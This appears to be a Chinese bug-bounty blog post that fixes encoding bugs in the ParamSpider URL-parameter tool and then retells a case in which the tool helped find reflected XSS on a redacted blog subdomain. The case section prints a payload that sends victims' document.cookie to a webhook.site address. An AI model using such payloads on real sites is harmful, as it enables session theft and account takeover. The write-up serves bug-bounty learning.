#  【海外SRC漏洞挖掘】参数FUZZ工具Bug修复+实战利用案例（任意用户接管）   
原创 fkalis  fkalis   2024-11-14 11:17  
  
# 海外SRC赏金挖掘专栏  
> **在学习SRC，漏洞挖掘，外网打点，渗透测试，攻防打点等的过程中，我很喜欢看一些国外的漏洞报告，总能通过国外的赏金大牛，黑客分享中学习到很多东西，有的是一些新的信息收集方式，又或者是一些骚思路,骚姿势，又或者是苛刻环境的漏洞利用。于是我打算开启这个专栏，将我认为优秀的文章进行翻译，加入我的理解和笔记，方便我自己学习和各位师傅共同进步，我争取做到日更，如果各位师傅觉得有用的话，可以给我点个关注~~ 如果师傅们有什么好的建议也欢迎联系我~~ 感谢各位师傅的支持~~**  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicdYMrcDj1IM8qV6I0rkpibO7pTY4CibicHmG6uHuL0eiasl9l6xI2MDRZaKhicsPUAdzslV95G055uvHibw/640?wx_fmt=png&from=appmsg "")  
# 正文部分  
## 场景介绍  
> **我们在使用 Wayback Machine 搜索历史泄露的URL的时候，面对这么大量的数据，会遇到很多没有用的数据，这时候我们可能需要进行一些过滤，才能更好的去进行FUZZ，这款工具就可以在 Wayback Machine 基础上进行过滤，提取出有用的接口和URL以及参数，结合FUZZ可以实现不一样的效果！！**  
  
```
https://github.com/devanshbatham/ParamSpider

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiceiaiaNJBqInYJ4ZJ6zpCJzVCAKYrXRicxpOdVrL4FibfH7RYf6I8TibjnKH31xpbACn01EReMthD0CeMQ/640?wx_fmt=png&from=appmsg "null")  
  
**Wayback Machine**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiceiaiaNJBqInYJ4ZJ6zpCJzVC6NSmOiaiatKVYuvhrAegAmhxAh7cbrOv33HO1ImVm3OflQwDKiabrJSrg/640?wx_fmt=png&from=appmsg "null")  
## Bug修复  
> **如果有懒得自己去修改的师傅可以直接去我GitHub上下载已经修改好的就行啦：**  
https://github.com/FFR66/ParamSpider  
  
****  
  
  
### 安装报错  
  
这个报错是因为set.up文件读取文件时候的编码问题导致的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiceiaiaNJBqInYJ4ZJ6zpCJzVCCqwyiavwxKsZkMJAzqAaia8kjicNV8EzHN1aPlzkqNTSdXA5D5ACouQLg/640?wx_fmt=png&from=appmsg "null")  
### 尝试修复  
  
在set.up文件中添加编码为utf-8即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiceiaiaNJBqInYJ4ZJ6zpCJzVCI0UAm5sN5g9pyXytSoZ1jkFMqVcNic4pFjdfEkSLF8oLuTdZC7UgL8A/640?wx_fmt=png&from=appmsg "null")  
  
成功进行安装  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiceiaiaNJBqInYJ4ZJ6zpCJzVCPbh4FklBB2wRryvhhHYz9oIOUq6BHcK8j55NWL59EvNovRWmrBSeiag/640?wx_fmt=png&from=appmsg "null")  
### 运行报错  
  
这个报错也是编码问题导致的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiceiaiaNJBqInYJ4ZJ6zpCJzVC5PO7jv9AsrU1gaRP89hgYkXqS4gLjUxObGXTOIKhCk9nhX7Lyd1Hibg/640?wx_fmt=png&from=appmsg "null")  
### 报错解决  
  
在main.py中的两处文件的读取的地方加入编码格式即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiceiaiaNJBqInYJ4ZJ6zpCJzVCTp8Z65h7233sT4SFhPl7Ip0Bx4vFAnFrCJbd9iavRlr1ic5icZnGbOibWw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiceiaiaNJBqInYJ4ZJ6zpCJzVCF3BOeyQsmWfcarDzialcwLwgVTHrJAlQqM4SfeiayNe8WTngjwfFVs5Q/640?wx_fmt=png&from=appmsg "null")  
### 正常使用  
```
paramspider -d xxx.edu.cn --proxy http://127.0.0.1:7890 -s
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiceiaiaNJBqInYJ4ZJ6zpCJzVCnia1BicnEIo44YRlotHnXuzoyyXxk56aicejWA0kibuMPicib2kov2203YKw/640?wx_fmt=png&from=appmsg "null")  
```
Tips：这里他自动将FUZZ填入了，可以尝试和fuff进行结合，进行参数值的FUZZ！！
```  
### 拓展  
> 通过阅读他的代码发现他的清理数据的过程本质上进行了两步：  
> 1. 清理想要过滤的后缀url2. 将参数值加入FUZZ后缀（可以自定义）  
  
  
**默认过滤的后缀**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiceiaiaNJBqInYJ4ZJ6zpCJzVCfW5Pwo3soNkLdgTpsgkX1zEwy4ubH47TKcicvyjpmV1TyTqtXDMVTiag/640?wx_fmt=png&from=appmsg "null")  
  
**我们可以根据自己的思路，子啊clean_urls中进行修改，例如加入对URL的验证等等，这就看各位师傅的思路了，如果有什么好的提议，也可以联系我，我加入在里面~~**  
```
def clean_urls(urls, extensions, placeholder):
"""    Clean a list of URLs by removing unnecessary parameters and query strings.    Args:        urls (list): List of URLs to clean.        extensions (list): List of file extensions to check against.    Returns:        list: List of cleaned URLs.    """
    cleaned_urls =set()
for url in urls:
        cleaned_url = clean_url(url)
ifnot has_extension(cleaned_url, extensions):
            parsed_url = urlparse(cleaned_url)
            query_params = parse_qs(parsed_url.query)
            cleaned_params ={key: placeholder for key in query_params}
            cleaned_query = urlencode(cleaned_params, doseq=True)
            cleaned_url = parsed_url._replace(query=cleaned_query).geturl()
            cleaned_urls.add(cleaned_url)
returnlist(cleaned_urls)
```  
## 实战案例  
> **原作者：https://medium.com/@jeetpal2007**  
****  
  
  
### 使用 ParamSpider 信息收集  
  
在寻找拥有数百万用户的程序（特别是大型博客网站，我将其称为 redacted.com）时，我首先列举了它的子域。我找到的一个子域是 **jp.redacted.com**。  
  
接下来，我使用 ParamSpider 收集所有可能的参数。我使用的命令是：  
```
param spider -d jp.redacted.com -s  
```  
  
此命令列出了终端中所有可能的参数。其中，我发现了一个名为 **s=** 的参数，成功发现XSS  
```
<script>alert(1)</script>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiceiaiaNJBqInYJ4ZJ6zpCJzVCfkSazKvmib51qa2GsNt6AQTrXxcdMV2aMoTic5DYwSasTypE9n7pQsJg/640?wx_fmt=png&from=appmsg "null")  
### 危害提升（获取cookie）  
  
这个站点没有使用httponly的机制，所以我们就可以使用 document.cookie 获取到cookie 提升危害  
```
<img src="x" onerror=document.location=%27https://webhook.site/790fbd5e-8cc4-441e-9a81-6ac18f40cb5f?c=%27+document.cookie;">
```  
  
成功捕获了受害者 cookie。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiceiaiaNJBqInYJ4ZJ6zpCJzVCaysfxSMxF8sLBxMXRvHazerXoTeFhUWxvofOQwC3PAktnylNBKOMBg/640?wx_fmt=png&from=appmsg "null")  
# 知识星球  
  
**具体的星球介绍可以看一下这里~~**  
  
[WingBy小密圈，他来了！](https://mp.weixin.qq.com/s?__biz=MzkyODcwOTA4NA==&mid=2247484765&idx=1&sn=01366a5d13fb4be7f9c0e69e565d64ff&chksm=c215e5eef5626cf8c87fcca7d784068772d364a12aa4b4a224aebd1e69bddf52fec0f791d000&token=276602823&lang=zh_CN&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicdYMrcDj1IM8qV6I0rkpibO7lPF38IqibU9Az906W6RHJBQhf2OR32Ks7sd8Xh4ric0VFRNR2lXmFwKA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/OlNJlSSibBicdCvkAftp00C0F9g6uLYXGnpAWQmOBwrqRUI6V26tvWqFJib6PmZO9fiaY0nia2An9JmtL5mMibqIAH5w/640?wx_fmt=jpeg&from=appmsg "null")  
  
**注意：帮会和星球是为了考虑大家的方便习惯，福利和内容是一致的，后续更新也是一致的~~~只需要进行一次付费就可以啦~~（建议还是使用帮会）**![](https://mmbiz.qpic.cn/mmbiz_jpg/OlNJlSSibBicf197vbRopEgYNZjbmJ00wHzicThAsLt7xehsSWC5JKY3NSEMkWbGolb0oSJmLlQlqHTic5bVyFgeBg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
# 项目合作  
  
  
**有甲方大大，或者厂商师傅，或者其他的项目，欢迎咨询，我以及团队始终将客户的需求放在首位，确保客户满意度~~**  
  
****  
**目前主要的服务范围：**  
****  
> **1. 渗透测试、漏洞扫描**  
  
**2. 代码审计**  
  
**3. 红蓝攻防**  
  
**4. 重保以及其他攻防类项目**  
  
**5. 红队武器化开发以及蓝队工具开发**  
  
**6. CTF相关赛事的培训等**  
  
**7. cnvd，cnnvd，edu，cve等证书**  
  
**8. nisp，cisp等证书**  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicdYMrcDj1IM8qV6I0rkpibO7ZJRQaUkzj4SdzlE2LemzRDG7yrl4rP4cFunhhibibX3CzGEPwFQzqIkw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
